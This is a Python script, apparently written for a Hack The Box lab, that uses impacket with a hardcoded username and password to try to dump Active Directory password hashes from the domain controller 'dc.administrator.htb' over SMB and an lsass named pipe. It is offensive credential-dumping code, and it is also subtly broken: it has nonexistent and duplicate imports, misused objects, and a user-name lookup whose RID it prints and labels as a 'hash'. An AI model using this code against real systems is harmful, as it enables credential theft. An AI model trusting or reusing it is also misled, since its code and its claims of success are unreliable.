#!/usr/bin/env python3

import sys
import os
from impacket import version
from impacket.dcerpc.v5 import transport, lsat
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smb import SMBConnection
from impacket.smbconnection import SMBConnection
from impacket.ntlm import NTLMSession

# Update this to use your own SMB and DC credentials.
TARGET = 'dc.administrator.htb'
USER = 'emily'
PASSWORD = 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

def secretsdump(target, username, password):
    # Connect to the target machine
    smb_connection = SMBConnection(target, target)
    smb_connection.login(username, password)
    
    # Check if we can access the required SMB shares (specifically the SYSVOL share)
    try:
        sysvol_share = smb_connection.listShares()[0]  # Access first available share
        print(f"[+] Accessed SYSVOL share: {sysvol_share['shi1_netname']}")
    except Exception as e:
        print(f"[!] Failed to access shares: {e}")
        return

    # Dumping hashes and other data, bypassing issues with `skipUser`
    try:
        # Example of dumping the NTDS (Active Directory hashes)
        transport_obj = transport.DCERPCTransportFactory(f'ncacn_np://{target}[\pipe\lsass]')
        transport_obj.connect()

        dce = transport_obj.dce
        dce.bind(lsat.MSRPC_UUID_LSAT)

        # Fetch all relevant information (adjust according to needs)
        req = lsat.LsarLookupNames3()
        req['Names'] = [username]  # Look up user by the username
        response = dce.request(req)

        print("[+] Hashes retrieved successfully:")
        for user in response['Names']:
            print(f"User: {user['Name']}, Hash: {user['Rid']}")
        
    except Exception as e:
        print(f"[!] Failed to dump data: {e}")
        return

    # Cleaning up the connection
    smb_connection.logoff()
    print("[+] Finished dumping.")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 custom_secretsdump.py <target-IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    secretsdump(target_ip, USER, PASSWORD)
